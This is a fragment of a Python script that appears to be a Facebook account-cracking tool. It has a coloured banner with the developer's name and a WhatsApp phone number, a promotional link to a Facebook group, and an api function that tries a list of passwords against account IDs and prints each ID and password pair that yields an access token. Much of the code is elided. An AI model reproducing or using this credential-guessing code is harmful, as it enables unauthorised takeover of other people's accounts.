...
os.system('espeak -a 300 "join, our , Facebook, group "')
os.system('xdg-open https://https://facebook.com/groups/1094033011587184/')
os.system('clear')
logo= ("""        
      
\x1b[38;5;81m  _    _           _____         _   _ 
\x1b[38;5;82m | |  | |   /\    / ____|  /\   | \ | |
\x1b[38;5;83m | |__| |  /  \  | (___   /  \  |  \| |
\x1b[38;5;84m |  __  | / /\ \  \___ \ / /\ \ | . ` |
\x1b[38;5;85m | |  | |/ ____ \ ____) / ____ \| |\  |
\x1b[38;5;86m |_|  |_/_/    \_\_____/_/    \_\_| \_|\x1b[38;5;197m(V-2.0)
\x1b[38;5;77m──────────────────────────────────────────────                 
\x1b[38;5;78m〘✧〙DEVLOPER  \x1b[38;5;222m➤  \x1b[38;5;78m HASAN BHAI
\x1b[38;5;79m〘✧〙FACEBOOK  \x1b[38;5;222m➤  \x1b[38;5;79m HASAN AHMED
\x1b[38;5;115m〘✧〙WHATSAPP  \x1b[38;5;222m➤   \x1b[38;5;115m+8801971637908
...
def api(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\x1b[38;5;155m[➤][HASAN-BHAI]-\x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
    try:
        for pas in pwv:
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\x1b[38;5;84m[HASAN-LIVE] '+ids+' ~~ '+pas+'\x1b[38;5;155m')
